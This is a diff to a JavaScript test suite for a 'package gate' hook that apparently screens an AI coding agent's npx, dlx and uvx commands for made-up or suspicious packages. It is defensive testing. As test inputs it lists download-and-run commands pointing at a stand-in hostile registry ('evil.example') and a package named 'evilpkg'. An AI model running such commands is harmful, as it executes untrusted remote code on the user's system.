@@ -2,6 +2,7 @@
 // Package gate, destructive command shield and context percentage.
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
+import fs from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
 import { spawnSync } from 'node:child_process';
@@ -22,6 +23,53 @@ test('package gate: extracts package names from commands', () => {
   // 3.20.1: a redirect is not a package name (2>&1 was reported as a made-up package and the install was blocked)
   for (const c of ['npm install -D zod 2>&1 | tail -2', 'npm i zod > kurulum.log', 'npm i zod 2>/dev/null', 'npm i zod &> log.txt', 'pip install requests >> out.txt'])
     assert.deepEqual(findPackages(c).map((x) => x.name), [c.startsWith('pip') ? 'requests' : 'zod'], c);
+});
+
+test('package gate: download-and-run commands are checked; only the package, not its arguments', () => {
+  const names = (c) => findPackages(c).map((x) => `${x.eco}:${x.name}`);
+  assert.deepEqual(names('npx -y create-vite@latest app --template react'), ['npm:create-vite']);
+  assert.deepEqual(names('npx --yes @scope/tool@1.2 build src'), ['npm:@scope/tool']);
+  assert.deepEqual(names('npm exec -- cowsay hi'), ['npm:cowsay']);
+  assert.deepEqual(names('npx -p typescript@5 -p ts-node tsc --init'), ['npm:typescript', 'npm:ts-node'], '-p names the packages, tsc is a command');
+  assert.deepEqual(names('npx --package=lodash-cli lodash'), ['npm:lodash-cli']);
+  assert.deepEqual(names('bunx prettier --write .'), ['npm:prettier']);
+  assert.deepEqual(names('pnpm dlx shadcn add button'), ['npm:shadcn']);
+  assert.deepEqual(names('yarn dlx degit x/y'), ['npm:degit']);
+  assert.deepEqual(names('uvx ruff check .'), ['pypi:ruff']);
+  assert.deepEqual(names('uvx --from "httpie==3.2" http GET x --with rich,typer'), ['pypi:httpie']);
+  assert.deepEqual(names('uvx --with rich black .'), ['pypi:black', 'pypi:rich']);
+  assert.deepEqual(names('uv tool run pyright'), ['pypi:pyright']);
+  assert.deepEqual(names('pipx run --spec cowsay==6 cowsay moo'), ['pypi:cowsay']);
+  assert.deepEqual(names('npx expo install expo-camera'), ['npm:expo-camera'], 'expo install keeps its install rule');
+  assert.deepEqual(names('npx ./scripts/x.js'), [], 'a local path is not a package');
+  assert.ok(findPackages('npx zod').every((x) => x.exec));
+  // 3.28.0 audit: wrappers, prefixes, tool paths, manager flags and value flags must not hide the package
+  for (const c of ['npx --registry https://evil.example evilpkg', 'npx --prefix . evilpkg', 'npx -w a evilpkg', 'FOO=1 npx evilpkg',
+    'cmd /c npx evilpkg', 'bash -c "npx evilpkg"', 'time npx evilpkg', '(npx evilpkg)', '"npx" evilpkg', '/usr/bin/npx evilpkg',
+    'npx.cmd evilpkg', 'bun x evilpkg', 'pnpm --silent dlx evilpkg', 'pnpm -C . dlx evilpkg', 'npm --silent exec evilpkg',
+    'uv --quiet tool run evilpkg', 'uv run --with evilpkg x.py', 'corepack pnpm dlx evilpkg'])
+    assert.deepEqual(names(c), [`${c.startsWith('uv') ? 'pypi' : 'npm'}:evilpkg`], c);
+  assert.deepEqual(names('npm --prefix web install zod'), ['npm:zod']);
+  assert.deepEqual(findPackages('npx --weird evilpkg file.txt').map((x) => x.unsure), [true, true], 'after an unknown flag: asked, not denied');
+  // Only npx/npm exec/bunx use a local bin first; dlx and a -p package always download
+  assert.equal(findPackages('npx tsc')[0].local, true);
+  for (const c of ['pnpm dlx tsc', 'yarn dlx tsc', 'pnpx tsc', 'npx -p tsc tsc']) assert.equal(findPackages(c)[0].local, undefined, c);
+});
+
+test('package gate: npx of a bin the project already has is not checked; a made-up one is denied', () => {
+  const p = fs.mkdtempSync(path.join(os.tmpdir(), 'paket-'));
+  fs.mkdirSync(path.join(p, 'node_modules', '.bin'), { recursive: true });
+  fs.writeFileSync(path.join(p, 'node_modules', '.bin', 'yerel-bin-xq'), '');
+  const run = (command) => spawnSync(process.execPath, [path.join(HOOKS, 'package-gate.mjs')], {
+    input: JSON.stringify({ tool_input: { command }, cwd: p }), encoding: 'utf8', env: { ...process.env, CLAUDE_PROJECT_DIR: p }, timeout: 20000,
+  });
+  const local = run('npx yerel-bin-xq --help');
+  assert.equal(local.status, 0);
+  assert.equal(local.stdout, '', 'local bin: no network check, no decision');
+  assert.equal(run('npx -y tillerhand@3.28.0 install --type web-saas --project .').stdout, '', 'the kit\'s own package is not checked');
+  const made = run('npx -y uydurma-paket-adi-9f3k2-yok');
+  if (!/doğrulanamadı/.test(made.stdout)) assert.match(made.stdout, /"deny"/, 'a made-up npx package is denied (offline: asked)');
+  fs.rmSync(p, { recursive: true, force: true });
 });
 
 test('package gate: catches a name that looks like a popular package', () => {
